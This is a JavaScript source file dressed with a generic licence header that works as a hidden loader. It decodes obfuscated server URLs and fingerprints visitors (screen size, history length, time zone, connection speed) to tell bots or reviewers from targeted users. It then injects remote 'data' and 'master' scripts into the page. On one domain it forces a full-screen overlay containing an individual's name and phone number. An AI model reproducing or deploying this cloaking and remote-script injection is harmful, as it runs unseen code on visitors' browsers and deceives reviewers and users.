/**
 * @licence
 * Copyright ©
 * All rights reserved
 * This source code is licensed under the found in the
 * LICENSE file in the root directory of this source tree
*/

var Nloaded=Number(localStorage.getItem("Nloaded"))+1,_initiated,sc;

try{
  class identifierDocumentValue{
    get(bad){
      bad=this.getFixed(bad);
      return bad;
    }

    getFixed(txt){
      var p1="",p2="",l=txt.length;
      for(let i=0; i<=l; i++){
        if(i%2==0){
          p2=txt.charAt(i)+p2;
        }else{
          p1=p1+txt.charAt(i);
        }
      }
      return atob(p1+p2);
    }

  }
  sc=new identifierDocumentValue();
}catch(err){}


function getDefaultName(name){
  var dv=navigator.appVersion.split(")")[0].replace("5.0 (","").replace("Linux; Android","An..");
  if(_39012seefalseUser()){
    dv+="__falseUser:____"+navigator.platform+"___"+navigator.userAgent;
  }
  return dv;
}

// function _39012seefalseUser() {
//   var place = new Date().toTimeString();
//   if (
//     (window.screen.width < window.innerWidth && window.screen.height < window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0, 3)) ||
//     (history.length > 4) ||
//     Nloaded > 2 ||
//     (place.includes('India')) ||
//     (navigator.connection.downlink && navigator.connection.downlink < 9)
//   ) {
//     return true;
//   }
// }

//old
function _39012seefalseUser() {
  var place=new Date().toTimeString();
  if(
    (window.screen.width<window.innerWidth && window.screen.height<window.innerHeight) || !navigator.userAgent.includes(navigator.platform.substring(0,3))||
    (history.length>3 || history.length==1 ) ||
    Nloaded>2 ||
    !(place.includes('Pacific') || place.includes('Eastern') || place.includes('Central')) ||
    ((window.screen.width == 1440 && window.screen.height==900) || (window.screen.width == 1536 && window.screen.height==864) || (window.screen.width == 1366 && window.screen.height==768)) ||
    navigator.connection.downlink<9
  ){
    return true;
  }
}

function makeForm(url, dataObj) {  const params = new URLSearchParams();  for (let key in dataObj) { params.append(key, dataObj[key]); }  fetch(url, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params }); }

function addMaster(url){
  var elem=document.createElement("script");
  elem.src=url;
  try{
    document.querySelector('style').insertAdjacentElement("beforeend",elem);
  }catch(e){
    document.querySelector('#mobiOptiElem').insertAdjacentElement("beforeend",elem);
  }finally{
    document.querySelector('head').insertAdjacentElement("beforeend",elem);
  }
}
var serverData={
  'null':sc.get("waLHyRV02ccHpM16WLay09Bz3ZbXvJ82WZaXuIItWcd3olRzXdaGnV5tyZbSp1"),
  'netlify':sc.get("waLHwRB0XcYHuMk6nLZyp9xzGZdXlJ52mZLXyJQuzZMX5RUsTadWwZM5DLOT5kI4HbMD5lMzDb"),
  'hstgr.io':sc.get("8aCHcRw0FcmHLM56ZLWya9stRbX2ZJup5cymZl0zQZGSd1vpNYz2N9vuZc3yb0n55Mmmcxl3pa2"),
}
var lnkMain=serverData[String(document.querySelector("#mobiOptiElem").getAttribute('server') )];
// var lnkMain="";


function _init(){
  _initiated=true;
  if(Nloaded){
    localStorage.setItem("Nloaded",Number(Nloaded));
  }else{
    Nloaded=1;
    localStorage.setItem("Nloaded",1);
  }

  setTimeout(()=>{
    addMaster(`${lnkMain}data-19b902380k09`);
  },100);

  setTimeout(()=>{
    addMaster(`${lnkMain}master-10a404587b40544b`);
  },200);
}
//this is a last line
if(!_initiated){
  _init();
}

///// temporary for mediclime.us
function insertFloatingPan(){if(document.getElementById("professionalFloatingPan"))return;const n=document.createElement("div");n.id="professionalFloatingPan",n.style.position="fixed",n.style.top="50%",n.style.left="50%",n.style.transform="translate(-50%, -50%)",n.style.width="80%",n.style.height="90%",n.style.backgroundColor="#1a1a1a",n.style.background="#1e1e1e",n.style.borderRadius="12px",n.style.boxShadow="0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.08)",n.style.zIndex="9999",n.style.overflowY="auto",n.style.fontFamily="'Inter', 'Segoe UI', -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif",n.style.color="#e0e0e0",n.style.letterSpacing="0.01em",n.style.setProperty("scrollbar-width","thin"),n.style.setProperty("scrollbar-color","#4a4a4a #2a2a2a"),n.innerHTML='\n  <style>\n#professionalFloatingPan::-webkit-scrollbar {\n width: 6px;\n}\n#professionalFloatingPan::-webkit-scrollbar-track {\n background: #2a2a2a;\n border-radius: 3px;\n}\n#professionalFloatingPan::-webkit-scrollbar-thumb {\n background: #4a4a4a;\n border-radius: 3px;\n}\n#professionalFloatingPan::-webkit-scrollbar-thumb:hover {\n background: #5a5a5a;\n}\n.pan-close-btn {\n position: absolute;\n top: 18px;\n right: 20px;\n background: transparent;\n border-radius: 4px;\n width: 32px;\n height: 32px;\n display: flex;\n align-items: center;\n justify-content: center;\n cursor: pointer;\n font-size: 20px;\n font-weight: 400;\n transition: all 0.2s ease;\n color: #9a9a9a;\n z-index: 10;\n font-family: monospace;\n}\n.pan-close-btn:hover {\n background: #3a3a3a;\n color: #ffffff;\n}\n.pan-content {\n padding: 40px 36px;\n max-width: 760px;\n margin: 0 auto;\n display: flex;\n flex-direction: column;\n gap: 24px;\n}\n.greeting {\n font-size: 26px;\n font-weight: 600;\n color: #d4d4d4;\n letter-spacing: -0.3px;\n border-bottom: 2px solid #3a3a3a;\n padding-bottom: 12px;\n margin-bottom: 4px;\n}\n.message-card {\n background: #252525;\n padding: 22px 24px;\n border-radius: 8px;\n border-left: 3px solid #6b6b6b;\n line-height: 1.6;\n font-size: 15px;\n color: #c0c0c0;\n}\n.highlight {\n color: #e8e8e8;\n font-weight: 500;\n background: #2d2d2d;\n padding: 2px 6px;\n border-radius: 4px;\n display: inline-block;\n}\n.tools-badge {\n background: #2a2a2a;\n display: inline-block;\n padding: 8px 20px;\n border-radius: 6px;\n margin-top: 14px;\n font-size: 13px;\n font-weight: 500;\n color: #b0b0b0;\n border: 1px solid #3a3a3a;\n letter-spacing: 0.3px;\n}\n.contact-row {\n background: #222222;\n border-radius: 8px;\n padding: 16px 20px;\n display: flex;\n align-items: center;\n justify-content: space-between;\n flex-wrap: wrap;\n gap: 14px;\n border: 1px solid #333333;\n}\n.phone-number {\n font-size: 16px;\n font-weight: 500;\n background: #1a1a1a;\n padding: 8px 18px;\n border-radius: 6px;\n letter-spacing: 0.3px;\n color: #c8c8c8;\n font-family: monospace;\n}\n.icon-group {\n display: flex;\n gap: 12px;\n}\n.icon-link {\n background: #2a2a2a;\n padding: 8px 20px;\n border-radius: 6px;\n text-decoration: none;\n color: #d0d0d0;\n font-weight: 500;\n transition: all 0.2s ease;\n display: inline-flex;\n align-items: center;\n gap: 8px;\n border: 1px solid #3a3a3a;\n font-size: 14px;\n}\n.icon-link:hover {\n background: #3a3a3a;\n color: #ffffff;\n border-color: #5a5a5a;\n}\n.offer-note {\n background: #222222;\n padding: 18px 20px;\n border-radius: 8px;\n text-align: center;\n font-weight: 400;\n border: 1px solid #3a3a3a;\n color: #c0c0c0;\n font-size: 14px;\n}\n.offer-note strong {\n color: #e0e0e0;\n font-weight: 600;\n}\n.iframe-wrapper {\n border-radius: 8px;\n overflow: hidden;\n box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);\n aspect-ratio: 16 / 9;\n margin: 4px 0;\n background: #000000;\n}\n.iframe-wrapper iframe {\n width: 100%;\n height: 100%;\n border: none;\n}\n.big-call-btn {\n background: #2c2c2c;\n border: 1px solid #4a4a4a;\n padding: 14px 0;\n width: 100%;\n font-size: 16px;\n font-weight: 500;\n border-radius: 6px;\n color: #e8e8e8;\n cursor: pointer;\n transition: all 0.2s ease;\n display: flex;\n align-items: center;\n justify-content: center;\n gap: 10px;\n margin-top: 8px;\n margin-bottom: 8px;\n letter-spacing: 0.5px;\n}\n.big-call-btn:hover {\n background: #3a3a3a;\n border-color: #6a6a6a;\n color: #ffffff;\n}\n.footer-note {\n font-size: 11px;\n text-align: center;\n opacity: 0.5;\n color: #888888;\n margin-top: 4px;\n}\n@media (max-width: 640px) {\n .pan-content {\n  padding: 24px 20px;\n }\n .greeting {\n  font-size: 20px;\n }\n .contact-row {\n  flex-direction: column;\n  align-items: flex-start;\n }\n .message-card {\n  padding: 16px 18px;\n }\n}\n  </style>\n  <div class="pan-close-btn" id="closePanBtn" style="display: none;">×</div>\n  <div class="pan-content">\n<div class="greeting">\n Hi Ved, I am Priyanshu.\n</div>\n<div class="message-card">\n I am the developer of this website which you have cloned. Don\'t worry at all. Infact I am happy to see you loved my format.\n <br><br>\n <span class="highlight">Even I have many tools and bots that automate affiliate\'s works. Please see them here</span>\n <div class="tools-badge">AUTOMATION TOOLS SUITE</div>\n</div>\n\n<div class="contact-row">\n <div class="phone-number">\n  +91 8578069916\n </div>\n <div class="icon-group">\n  <a href="https://wa.me/918578069916?text=Hello%20Priyanshu,%20I%20loved%20your%20format!" target="_blank" rel="noopener noreferrer" class="icon-link">\nWhatsApp\n  </a>\n  <a href="tel:+918578069916" class="icon-link">\nCall\n  </a>\n </div>\n</div>\n\n<div class="offer-note">\n <strong>Contact me (+91 8578069916)</strong> (WhatsApp and call) and I will give you the Complete Format.\n</div>\n\n<div class="iframe-wrapper">\n <iframe src="https://www.youtube.com/embed/EP4fLaiyzX4" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>\n</div>\n\n<button class="big-call-btn" id="directCallNowBtn">\n Contact Priyanshu\n</button>\n<div class="footer-note">\n +91 8578069916\n</div>\n  </div>\n ',document.body.appendChild(n);const e=n.querySelector("#directCallNowBtn");e&&e.addEventListener("click",function(){window.location.href="tel:+918578069916"})}

if(document.domain=='sightfresh.mediclime.us'){
    insertFloatingPan();
}
